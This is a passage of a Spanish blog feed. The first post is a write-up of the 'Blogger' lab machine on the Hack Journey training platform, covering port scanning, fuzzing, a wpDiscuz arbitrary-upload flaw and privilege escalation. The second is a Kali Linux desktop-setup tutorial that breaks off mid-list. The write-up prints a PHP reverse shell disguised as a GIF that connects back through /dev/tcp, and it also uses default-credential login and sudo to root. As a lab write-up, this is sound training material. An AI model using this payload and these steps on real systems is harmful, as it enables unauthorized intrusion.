href="http://localhost:4000/blogger-hackjourney/" rel="alternate" type="text/html" title="Blogger - Hack Journey" /><published>2024-10-16T00:00:00-06:00</published><updated>2024-10-16T00:00:00-06:00</updated><id>http://localhost:4000/blogger-hackjourney</id><content type="html" xml:base="http://localhost:4000/blogger-hackjourney/"><![CDATA[<p>Esta máquina es de la plataforma Hack Journey <a href="https://www.aprendehacking.com/products/hack-journey">visitar</a></p>

<p>Dificultad: Fácil</p>

<p>Habilidades:</p>

<ul>
  <li>Fuzzing</li>
  <li>Information Leakage</li>
  <li>CMS Exploitation (Wordpress)</li>
  <li>PHP Reverse Shell (Bypass upload file with GIF)</li>
  <li>Lateral Movement</li>
</ul>

<p><img src="/assets/images/hj-writeup-blogger/blogger.png" alt="Captura de pantalla (62).png" /></p>

<h1 id="ip-de-la-maquina">IP de la Maquina</h1>

<p>10.10.0.5</p>

<h1 id="reconocimiento">Reconocimiento</h1>

<p>Comprobando conectividad con la maquina</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.10.0.5
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/ping.png" alt="ping.png" /></p>

<p>Identificando el sistema operativo lo realizamos con un script en python que en base al TTL nos dice ante que SO nos encontramos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wichSystem.py
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/SO.png" alt="SO.png" /></p>

<h1 id="enumeración">Enumeración</h1>

<p>Escaneo de los puertos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> scanP 10.10.0.5

<span class="c"># sudo Privilegios de administrador</span>
<span class="c"># -p- Para que escanee todo el rango de puertos disponible (65,535)</span>
<span class="c"># --open Solo muestre los puertos abiertos (no filtrados ni cerrados)</span>
<span class="c"># -sS Aplicamos un tcp Syn port Scan (agilizar el escaneo)</span>
<span class="c"># --min-rate 5000 Agilizar escaneo</span>
<span class="c"># -vvv Nos reporte por consola a medida nos vaya descubriendo cosas</span>
<span class="c"># -n Para que no aplique resolucion DNS (ralentiza el escaneo)</span>
<span class="c"># -Pn (el favorito de todos XD) Para que no aplique descubrimiento de hosts (host discovery)</span>
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/scanP.png" alt="scanP.png" /></p>

<p>Vamos a utilizar una serie de scripts básicos de reconocimiento de nmap, detectar las versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito scanS.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-oN</span> scanS 10.10.0.5

<span class="c"># -sCV Lanzamos scripts básicos de reconocimiento y detectamos versiones para esos servicios</span>
<span class="c"># -p Indicamos los puertos</span>
<span class="c"># -oN Guardamos en formato nmap o formato normal (tal como se muestra por consola) </span>
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/scanS.png" alt="scanS.png" /></p>

<p>Como únicamente tenemos 2 puertos abiertos, uno es el 22 donde corre el servicio SSH para el cual no tenemos credenciales, Inspeccionando la web un poco, viendo el Código fuente, no logramos encontrar nada relevante.</p>

<p>Usando Wappalyzer  el cual es un Pluggin del navegador, podemos ver las tecnologías con las que esta hecha una web de igual manera con whatweb es lo mismo pero a nivel de consola. No encontramos nada relevante.</p>

<p><img src="/assets/images/hj-writeup-blogger/wappalyzer.png" alt="wappalyzer.png" /></p>

<p>Whatweb</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.0.5
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/whatweb.png" alt="whatweb.png" /></p>

<p>Pasamos a lo siguiente, realizar fuzzing sobre la pagina para lograr encontrar directorios ocultos.</p>

<p>Usaremos ffuf para realizar el fuzzing</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-ic</span> <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-fc</span><span class="o">=</span>404 <span class="nt">-r</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.0.5/FUZZ

<span class="c"># -ic Para ocultar comentarios de los diccionarios</span>
<span class="c"># -c Formato colorizado</span>
<span class="c"># -t Cantidad de hilos </span>
<span class="c"># -fc Para filtrar (que no nos muestre ese resultado)</span>
<span class="c"># -r Para que siga las redirecciones</span>
<span class="c"># -w Indicar el diccionario  </span>
<span class="c"># -u Indicamos la url</span>
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/fuzzing.png" alt="fuzzing.png" /></p>

<p>Gracias al fuzzing encontramos algunos directorios, inspeccionando los directorios, nos encontramos con algo interesante en assets/fonts.</p>

<p><img src="/assets/images/hj-writeup-blogger/fuzzing_2.png" alt="fuzzing 2.png" /></p>

<p>Revisando el directorio encontramos un tipo de blog que al parecer esta hecho en wordpress, pero no tenemos acceso, revisando un poco mas nos encontramos con un subdominio. Tenemos que agregarlo al /etc/hosts para que podamos acceder.</p>

<p><img src="/assets/images/hj-writeup-blogger/VirtualHosting.png" alt="VirtualHosting.png" /></p>

<p>Una vez agregado el subdominio visitamos la web, vemos que esta hecho en wodrpess y analizamos nuevamente con wappalyzer para comprobarlo.</p>

<p><img src="/assets/images/hj-writeup-blogger/wordpress.png" alt="wordpress.png" /></p>

<p>En efecto esta construida con wordpress, ahora que estamos ante un CMS podemos utilizar distintas herramientas para comprobar la seguridad de esta, en este caso usaremos wpscan. Realizando varias pruebas no logramos mediante escaneo pasivo encontrar información sobre pluggins vulnerables pero al cambiar a modo agresivo si logramos identificar varias vulnerabilidades para un plugin en concreto (wpDiscuz), y también identificamos un nombre de usuario j@m3s.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.0.5/assets/fonts/blog/ <span class="nt">-e</span> vp,u <span class="nt">--plugins-detection</span> aggressive <span class="nt">--api-token</span>

<span class="c"># --url Indicamos la url</span>
<span class="c"># -e vp Para que nos detecte pluggins vulnerables y u para que nos identifique posibles usuarios </span>
<span class="c"># --plugins-detection Cambiar el modo de deteccion de los pluggins, en este caso usamos el agresivo</span>
<span class="c"># --api-token le pasamos la API de wpscan ya que sin esta limita la busqueda de info </span>
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/wpdiscuz.png" alt="wpdiscuz.png" /></p>

<h1 id="explotación">Explotación</h1>

<p>Nos encontramos varias vulnerabilidades, realizando varias pruebas la que me funciono fue Unauthenticated Arbitrary File Upload, mediante el sistema de comentarios de un post subir una reverse shell haciendo bypassing de el campo de imágenes, subiendo la revshell como GIF.</p>

<p><img src="/assets/images/hj-writeup-blogger/uploadfile.png" alt="uploadfile.png" /></p>

<p>Contenido de la revshell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF89a<span class="p">;</span>
&lt;?php
<span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.0.12/1234 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span> ?&gt;

<span class="c">#Agregamos la primer linea para que la interprete como GIF</span>
</code></pre></div></div>

<p>Ahora solo necesitamos ingresar a la ruta donde se almacena la revshell, para hacerlo simplemente hacemos clic sobre el archivo, y nos ponemos en escucha con netcat.</p>

<p><img src="/assets/images/hj-writeup-blogger/revshell_upload.png" alt="revshell upload.png" /></p>

<p>Nos ponemos en escucha</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 1234
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/nc.png" alt="nc.png" /></p>

<p>Una vez hecho sucede la magia y conseguimos acceso a la maquina como el usuario www-data</p>

<p><img src="/assets/images/hj-writeup-blogger/access.png" alt="access.png" /></p>

<p>Realizamos un tratamiento de la TTY para poder tener una shell estable y full interactiva.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script <span class="nt">-c</span> bash /dev/null
ctrl + z
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span> <span class="o">(</span>para traer el proceso de nuevo<span class="o">)</span>
reset xterm
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash

<span class="c">#Le damos las proporciones adecuadas en mi caso 37 filas y 184 columnas</span>
<span class="nb">stty </span>rows 37 columns 184

<span class="c">#Listo con esto ya tenemos una shell totalmente interactiva</span>

</code></pre></div></div>

<p>Realizamos un cat al /etc/passwd para ver que usuarios tenemos disponibles</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd
</code></pre></div></div>

<p><img src="/assets/images/hj-writeup-blogger/passwd.png" alt="passwd.png" /></p>

<p>Visualizamos los home de cada usuario ya que podemos entrar y dentro de James encontramos el user.txt pero no tenemos permisos para visualizar el archivo.</p>

<p><img src="/assets/images/hj-writeup-blogger/user_denied.png" alt="user denied.png" /></p>

<p>Ahora nos queda realizar escalada de privilegios mediante movimiento lateral intentando cambiar de usuario.</p>

<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>

<p>Como observamos tenemos usuarios con nombres por defecto así que probamos credenciales por defecto. y logramos acceder como el usuario vagrant.</p>

<p><img src="/assets/images/hj-writeup-blogger/vagrant_user.png" alt="vagrant user.png" /></p>

<p>Ahora comprobamos una serie de comandos para ver de que forma podemos elevar nuestros privilegios. vemos que con el comando sudo -l podemos ejecutar cualquier comando sin proporcionar contraseña.</p>

<p><img src="/assets/images/hj-writeup-blogger/sudo_-l.png" alt="sudo -l.png" /></p>

<p>Cambiamos al usuario James para ver el user.txt</p>

<p><img src="/assets/images/hj-writeup-blogger/usertxt.png" alt="usertxt.png" /></p>

<p>Nos encontramos con un archivo que si observamos bien esta codificado en base64. Lo copiamos en nuestra maquina y vemos que contiene el archivo.</p>

<p><img src="/assets/images/hj-writeup-blogger/base64_decode.png" alt="base64 decode.png" /></p>

<p>Nos encontramos con la flag de la maquina, para ganar privilegios máximos, recordemos que con el usuario vagrant podemos ejecutar cualquier comando sin proporcionar la contraseña. Solo ejecutamos sudo root y ganamos privilegios totales sobre la maquina.</p>

<p><img src="/assets/images/hj-writeup-blogger/root.png" alt="root.png" /></p>

<p>Ya con esto hemos completado la maquina. ¡Gracias por leer hasta aquí! Espero que este writeup te haya sido útil para comprender mejor los pasos para resolver esta máquina.  ¡Nos vemos en el próximo reto, y sigue hackeando con ética!</p>

<p>Para agregar como extra si con el usuario vagrant visualizábamos las tareas cron nos encontramos una tarea aparte de las que son por defecto. Al visualizarla vemos que ejecuta un script el usuario root. Intentamos ver el script y logramos hacerlo, el script hace un comprimido del home del usuario james y lo almacena en el directorio /tmp, probamos descomprimir y lo hacemos sin problema, de esta manera también podemos obtener la flag ya que nos muestra el base64.</p>

<p><img src="/assets/images/hj-writeup-blogger/cat_crontab.png" alt="cat crontab.png" /></p>

<p><img src="/assets/images/hj-writeup-blogger/vagrant_base64.png" alt="vagratnt base64.png" /></p>

<p>Y esta seria otra forma de obtener la flag, solo como dato curioso. Nos vemos</p>]]></content><author><name>ewor01</name></author><category term="hackjourney" /><category term="Fácil" /><category term="Linux" /><category term="Wordpress" /><category term="Fuzzing" /><category term="Information Leakage" /><category term="CMS Exploitation (Wordpress)" /><category term="PHP Reverse Shell (Bypass upload file with GIF)" /><category term="Lateral Movement" /><summary type="html"><![CDATA[Blogger es una máquina donde estaremos explotando una vulnerabilidad en el gestor de contenido wordpress con la que vamos a lograr acceso al servidor, posteriormente para escalar privilegios tendremos que hacer unos movimientos laterales para cambiar de usuario y obtener el root de la máquina.]]></summary></entry><entry><title type="html">Personalización de Entorno en Kali Linux para Pentesting</title><link href="http://localhost:4000/entorno-personalizado/" rel="alternate" type="text/html" title="Personalización de Entorno en Kali Linux para Pentesting" /><published>2024-02-19T00:00:00-06:00</published><updated>2024-02-19T00:00:00-06:00</updated><id>http://localhost:4000/entorno-personalizado</id><content type="html" xml:base="http://localhost:4000/entorno-personalizado/"><![CDATA[<p align="center">
<img src="/assets/images/entorno-personalizado/entorno-personalizado.png" />
</p>

<h1 id="personalización-de-entorno-en-kali-linux-para-pentesting">Personalización de Entorno en Kali Linux para Pentesting</h1>

<h2 id="resumen">Resumen</h2>

<p>Este tutorial te guiará paso a paso a través de la personalización de tu entorno en Kali Linux, utilizando herramientas como bspwm, sxhkd, polybar, Powerlevel10k, zsh, y Kitty, etc. Estas personalizaciones están diseñadas para mejorar la eficiencia y hacer más cómodas las tareas de pentesting. Créditos para <a href="https://twitter.com/s4vitar">s4vitar</a> ya que es el creador del entorno y quien nos aporta mucho a la comunidad de ciberseguridad.</p>

<h2 id="dependencias-necesarias">Dependencias Necesarias</h2>

<ul>
  <li><strong>Kali Linux instalado</strong>: Asegúrate de tener Kali Linux instalado en tu máquina.</li>
  <li><strong>Conexión a internet</strong>: Necesitarás acceso a Internet para descargar e instalar paquetes.</li>
  <li><strong>Archivos necesarios para la configuración</strong>: Estos archivos están en un comprimido y organizados por carpetas, cada una con sus respectivos nombres, para que se puedan guiar y no se confundan a la hora de copiarlos. <a href="https://ewor01.github.io/assets/files/entornoPersonalizadoKaliLinux.rar">Descargar</a></li>
</ul>

<h2 id="pasos">Pasos</h2>

<h2 id="actualización-del-sistema-operativo">Actualización del sistema operativo</h2>

<p>Actualizaremos nuestro sistema operativo mediante los siguientes comandos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
<span class="nb">sudo </span>apt upgrade
</code></pre></div></div>

<p>instalamos paquetes necesarios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>build-essential git vim libxcb-util0-dev libxcb-ewmh-dev libxcb-randr0-dev libxcb-icccm4-dev libxcb-keysyms1-dev libxcb-xinerama0-dev libasound2-dev libxcb-xtest0-dev libxcb-shape0-dev
</code></pre></div></div>

<p>Luego si todo esta bien, nos colocamos como usuario sin privilegios y clonamos los siguientes repositorios en nuestra carpeta de descargas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/baskerville/bspwm.git
git clone https://github.com/baskerville/sxhkd.git
</code></pre></div></div>

<p>Entramos en cada directorio y hacemos los siguientes pasos para ambos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>bspwm
make
<span class="nb">sudo </span>make <span class="nb">install

cd </span>sxhkd
make
<span class="nb">sudo </span>make <span class="nb">install</span>
</code></pre></div></div>

<p>Por si hay algún problema con el paquete libxinerama instalarlo aparte:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>libxinerama1 libxinerama-dev
</code></pre></div></div>

<p>Creamos los directorios del bspwm y sxhkd dentro del directorio config:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> ~/.config/<span class="o">{</span>bspwm,sxhkd<span class="o">}</span>
</code></pre></div></div>

<p>Ahora nos copiamos el archivo bspwmrc que esta dentro del directorio bspwm/examples:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp </span>bspwmrc ~/.config/bspwm
</code></pre></div></div>

<p>Hacemos lo mismo para el sxhkdrc que esta en la misma ruta:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp </span>sxhkdrc ~/.config/sxhkd
</code></pre></div></div>

<h2 id="instalamos-y-configuramos-kitty">Instalamos y Configuramos kitty</h2>

<p>Procedemos a instalar la kitty la cual usaremos como terminal</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>kitty
</code></pre></div></div>

<h2 id="modificando-el-sxhkdrc">Modificando el sxhkdrc</h2>

<p>Luego en el sxhkdrc sustituimos la terminal por la kitty usando la ruta absoluta:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which kitty
/usr/bin/kitty
</code></pre></div></div>

<p>Sustituimos esto en el archivo como lo mencionamos arriba y debería quedar así:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># terminal emulator</span>
super + Return
        /usr/bin/kitty
</code></pre></div></div>

<p>Modificaremos a nuestro gusto el sxhkd solo agregaremos una configuración y una carpeta que crearemos dentro de ~/.config/bspwm que se llame scripts, el nombre del script sera bspwm_resize le daremos permisos de ejecución y lo llamaremos desde el sxhkdrc:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Custom move/resize</span>
alt + super + <span class="o">{</span>Left,Down,Up,Right<span class="o">}</span>
        /home/tu_usuario/.config/bspwm/scripts/bspwm_resize <span class="o">{</span>west,south,north,east<span class="o">}</span>
</code></pre></div></div>

<p>El contenido del script es el siguiente, este script nos permitirá redimensionar los tamaños de las ventanas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env dash</span>

<span class="k">if </span>bspc query <span class="nt">-N</span> <span class="nt">-n</span> focused.floating <span class="o">&gt;</span> /dev/null<span class="p">;</span> <span class="k">then
        </span><span class="nv">step</span><span class="o">=</span>20
<span class="k">else
        </span><span class="nv">step</span><span class="o">=</span>100
<span class="k">fi

case</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="k">in
        </span>west<span class="p">)</span> <span class="nb">dir</span><span class="o">=</span>right<span class="p">;</span> <span class="nv">falldir</span><span class="o">=</span>left<span class="p">;</span> <span class="nv">x</span><span class="o">=</span><span class="s2">"-</span><span class="nv">$step</span><span class="s2">"</span><span class="p">;</span> <span class="nv">y</span><span class="o">=</span>0<span class="p">;;</span>
        east<span class="p">)</span> <span class="nb">dir</span><span class="o">=</span>right<span class="p">;</span> <span class="nv">falldir</span><span class="o">=</span>left<span class="p">;</span> <span class="nv">x</span><span class="o">=</span><span class="s2">"</span><span class="nv">$step</span><span class="s2">"</span><span class="p">;</span> <span class="nv">y</span><span class="o">=</span>0<span class="p">;;</span>
        north<span class="p">)</span> <span class="nb">dir</span><span class="o">=</span>top<span class="p">;</span> <span class="nv">falldir</span><span class="o">=</span>bottom<span class="p">;</span> <span class="nv">x</span><span class="o">=</span>0<span class="p">;</span> <span class="nv">y</span><span class="o">=</span><span class="s2">"-</span><span class="nv">$step</span><span class="s2">"</span><span class="p">;;</span>
        south<span class="p">)</span> <span class="nb">dir</span><span class="o">=</span>top<span class="p">;</span> <span class="nv">falldir</span><span class="o">=</span>bottom<span class="p">;</span> <span class="nv">x</span><span class="o">=</span>0<span class="p">;</span> <span class="nv">y</span><span class="o">=</span><span class="s2">"</span><span class="nv">$step</span><span class="s2">"</span><span class="p">;;</span>
<span class="k">esac</span>

bspc node <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$dir</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$x</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$y</span><span class="s2">"</span> <span class="o">||</span> bspc node <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$falldir</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$x</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$y</span><span class="s2">"</span>
</code></pre></div></div>

<p>Si nos da un problema cuando estamos como root hacemos control c cuando tire el error y luego ponemos compaudit y la ruta que nos de se la asignamos a root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chown </span>root:root y la ruta
</code></pre></div></div>

<p>Instalamos otros paquetes:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>cmake cmake-data pkg-config python3-sphinx libcairo2-dev libxcb1-dev libxcb-util0-dev libxcb-randr0-dev libxcb-composite0-dev python3-xcbgen xcb-proto libxcb-image0-dev libxcb-ewmh-dev libxcb-icccm4-dev libxcb-xkb-dev libxcb-xrm-dev libxcb-cursor-dev libasound2-dev libpulse-dev libjsoncpp-dev libmpdclient-dev libuv1-dev libnl-genl-3-dev
</code></pre></div></div>

<h2 id="instalación-de-polybar">Instalación de polybar:</h2>

<p>Luego nos vamos a nuestro directorio de descargas y nos clonamos el siguiente repositorio para instalar la polybar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone <span class="nt">--recursive</span> https://github.com/polybar/polybar]<span class="o">(</span>https://github.com/polybar/polybar
</code></pre></div></div>

<p>Entramos al directorio de la polybar y creamos un directorio llamado build, entramos al directorio y hacemos cmake:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>build
<span class="nb">cd </span>build
cmake ..
</code></pre></div></div>

<p>Hacemos lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make <span class="nt">-j</span><span class="si">$(</span><span class="nb">nproc</span><span class="si">)</span>
</code></pre></div></div>

<p>Ahora hacemos un sudo make install y queda lista la polybar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>make <span class="nb">install</span>
</code></pre></div></div>

<p>Instalamos otros paquetes necesarios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>meson libxext-dev libxcb1-dev libxcb-damage0-dev libxcb-xfixes0-dev libxcb-shape0-dev libxcb-render0-dev libxcb-composite0-dev libxcb-image0-dev libxcb-present-dev libxcb-xinerama0-dev libpixman-ls1-dev libdbus-1-dev libconfig-dev libgl1-mesa-dev libpcre2-dev libevdev-dev uthash-dev libev-dev libx11-xcb-dev libxcb-glx0-dev
</code></pre></div></div>

<p>Clonamos el siguiente repositorio para instalar picom y jugar con las transparencias:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/ibhagwan/picom.git
</code></pre></div></div>

<p>Entramos al directorio y escribimos los siguientes comandos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git submodule update <span class="nt">--init</span> <span class="nt">--recursive</span>
meson <span class="nt">--buildtype</span><span class="o">=</span>release <span class="nb">.</span> build
</code></pre></div></div>

<p>Si nos da algún error de deprecated instalamos el siguiente paquete:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>libpcre3 libpcre3-dev
</code></pre></div></div>

<p>luego ya todo tiene que estar correcto, hay un error de libev pero no afecta.</p>

<p>Continuamos ejecutando los siguientes comandos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ninja <span class="nt">-C</span> build
<span class="nb">sudo </span>ninja <span class="nt">-C</span> build <span class="nb">install</span>
</code></pre></div></div>

<p>Instalamos rofi y bspwm:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>rofi
<span class="nb">sudo </span>apt <span class="nb">install </span>bspwm
</code></pre></div></div>

<p>Probamos el entorno que todo vaya bien, hacemos un kill -9 -1 y entramos pero antes de iniciar sesión debemos seleccionar bspwm como entorno. Ya probado que todo nos funciona bien, procedemos con la instalación de la fuente.</p>

<h2 id="instalación-de-la-fuente">Instalación de la fuente</h2>

<p>Nos dirigimos a la pagina para descargar la fuente llamada (hack nerd font):
<a href="https://www.nerdfonts.com/font-downloads">Ver pagina</a></p>

<p>Nos situamos en el directorio /usr/local/share/fonts y nos ponemos como super usuario para mover el archivo descargado a ese directorio:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv</span> /home/su nombre de usuario/Downloads/Hack.zip <span class="nb">.</span>
</code></pre></div></div>

<p>luego hacemos unzip para descomprimir el contenido y borramos el comprimido:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip Hack.zip
<span class="nb">rm </span>Hack.zip
</code></pre></div></div>

<p>Hacemos que nos funcione la clipboard bidireccional agregando este comando al final del archivo bspwmrc:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vmware-user-suid-wrapper &amp;
</code></pre></div></div>

<h2 id="configuración-de-la-kitty">Configuración de la kitty</h2>

<p>Copiaremos 2 archivos que meteremos dentro de ~/.config/kitty
uno es color.ini y el otro es kitty.conf (los cuales estan en los archivos que les deje al inicio).</p>

<p>Nos ponemos como root y como el tiene otra kitty nos pasamos los archivos de configuración</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /home/su usuario/.config/kitty/<span class="k">*</span> <span class="nb">.</span>
</code></pre></div></div>

<p>Instalamos feh:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>feh
</code></pre></div></div>

<p>Nos creamos una carpeta dentro del escritorio con nuestro nombre de usuario luego otra que se llame Fondos y ahi dentro colocamos el fondo que queremos tener
ahora agregamos este comando al bspwmrc:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feh <span class="nt">--bg-fill</span> /home/ewor01/Desktop/ewor01/Fondos/fondo.png &amp;
</code></pre></div></div>

<p>Instalamos un paquete para visualizar imágenes desde la kitty:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>imagemagick
</code></pre></div></div>

<p>Para visualizar una imagen desde la kitty utilizamos el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kitty +kitten icat imagen.jpg
</code></pre></div></div>

<p>Instalamos scub para eliminar archivos y hacer mas difícil el rescate de estos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>scrub
</code></pre></div></div>

<h2 id="configuración-de-la-polybar">Configuración de la polybar</h2>

<p>Ahora nos dirigimos al directorio Downloads y clonamos el siguiente repositorio:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/VaughnValle/blue-sky.git
</code></pre></div></div>

<p>Creamos el directorio de polybar y copiamos todo dentro del directorio situados dentro de /blue-sky/polybar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> ~/.config/polybar
<span class="nb">cp</span> <span class="nt">-r</span> <span class="k">*</span> ~/.config/polybar
</code></pre></div></div>

<p>Ponemos este comando en el bspwmrc de la siguiente manera:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'~/.config/polybar/./launch.sh'</span> <span class="o">&gt;&gt;</span> ~/.config/bspwm/bspwmrc
</code></pre></div></div>

<p>Nos dirigimos dentro del directorio blue-sky/polybar/fonts y copiaremos las fuentes en /usr/share/fonts/truetype como super usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo cp</span> <span class="k">*</span> /usr/share/fonts/truetype
</code></pre></div></div>

<p>Aplicamos este comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fc-cache <span class="nt">-v</span>
</code></pre></div></div>

<p>Configuramos la polybar y todos sus módulos.
creamos un directorio llamado picom dentro de ~/.config como usuario normal:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>picom
</code></pre></div></div>

<p>Nos pasamos el archivo picom.conf y ahora configuramos picom a nuestro gusto si queremos blur o no y luego en kitty.conf agregamos lo siguiente dependiendo la opacidad que queramos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>background_opacity 0.95
</code></pre></div></div>

<h2 id="modificando-la-polybar">Modificando la polybar</h2>

<p>Buscamos font-6 en current.ini de los archivos de la polybar de nuestra configuración y agregamos estas líneas para que nos salga el icono que queramos en la parte izquierda:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"font-7 = "</span>Hack Nerd Font Mono:size<span class="o">=</span>35<span class="p">;</span>8.0<span class="s2">"
</span></code></pre></div></div>

<p>Estos valores ya dependerá del gusto y icono que coloquen, pero para que funcione agregar esas líneas debajo de font-6.</p>

<h2 id="privacidad-de-firefox-y-algunos-plugins">Privacidad de firefox y algunos plugins</h2>

<p>Si queremos vamos a hacer que firefox no recuerde nuestro historial mas que todo es depende las opciones de cada persona si gustan lo hacen o no.
Nos dirigimos a Settings &gt; Privacy &amp; Security &gt; Luego buscamos donde dice History y colocamos never remember history, reinician y listo.</p>

<p>Instalamos un plugin llamado darkreader en firefox para colocar modo oscuro en las paginas que queramos.
Instalamos otro plugin llamado wappalyzer que nos ayudara en pentesting web a identificar las tecnologías que utilizan las webs.</p>

<h2 id="instalación-de-powerlevel10k">Instalación de powerlevel10k</h2>

<p>Instalamos la Powerlevel10k
nos dirigimos al repositorio:
<a href="https://github.com/romkatv/powerlevel10k">ver repositorio</a>)
